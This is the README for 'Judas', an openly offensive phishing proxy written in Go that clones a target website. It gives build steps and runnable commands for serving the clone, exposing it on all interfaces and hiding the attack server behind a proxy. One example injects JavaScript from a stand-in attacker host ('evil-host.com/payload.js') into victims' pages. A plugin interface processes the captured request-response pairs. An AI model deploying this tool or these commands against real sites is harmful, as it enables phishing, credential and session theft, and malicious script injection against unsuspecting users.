Judas
=====
Judas is a phishing proxy.
It can clone a website passed to it using command line flags.

Building
--------
To build Judas, first, get the dependencies:
 ```
 go get golang.org/x/net/proxy
 go get github.com/PuerkitoBio/goquery
 go build -o judas *.go
 ```

 Next, build the logging plugin if you want to see responses on the console.
```
go build -buildmode=plugin -o loggingplugin.so bundled/loggingplugin.go
```

To add other plugins, simply place the .so files into the same directory as the judas executable.

Usage
-----
The target ```--target``` flag is required.
By default, Judas requires a path to a SSL certificate (```--cert```) and a SSL private key (```--private-key```).
If you want to listen using HTTP, pass the ```--insecure``` flag.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key
```

```
./judas --target https://target-url.com --insecure
```

It can optionally use an upstream proxy with the ```--proxy``` argument to proxy Tor websites or hide the attack server from the target.

Example:
```
./judas --target https://torwebsite.onion --cert server.crt --private-key server.key --proxy localhost:9150
```

By default, Judas listens on localhost:8080.
To change this, use the ```--address``` argument.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key --address=0.0.0.0:8080
```

Judas can also inject custom JavaScript into requests by passing a URL to a JS file with the ```--inject-js``` argument.

Example:
```
./judas --target https://target-url.com --cert server.crt --private-key server.key --inject-js https://evil-host.com/payload.js
```

Custom plugins
--------------
To create your own plugin, simply create a Go plugin using the standard library plugin package (https://golang.org/pkg/plugin/).

Judas looks for the following symbols:
```
var Plugin plugins.Plugin
```

Your plugins must implement the Plugin interface found in github.com/joncooperworks/judas/plugins.

```
// Plugin contains functions and variables that Judas will be looking for in your plugin.
// Plugins will be loaded from any .so file in the same directory as the judas executable.
type Plugin interface {
	// Name of the plugin.
	Name() string

	// Initialize is where you should do your plugin's setup, like defining command line flags.
	// You are allowed to return a PluginArguments of arguments that will be passed to your ProcessTransactions function.
	Initialize() (PluginArguments, error)

	// ProcessTransactions takes a chan that produces request - response pair and does something.
	// Judas plugins should implement this function to process request - response pairs as they are generated.
	// Requests and responses will be passed by value, allowing each plugin to run in its own goroutine.
	ProcessTransactions(<-chan HTTPTransaction, PluginArguments)
}
```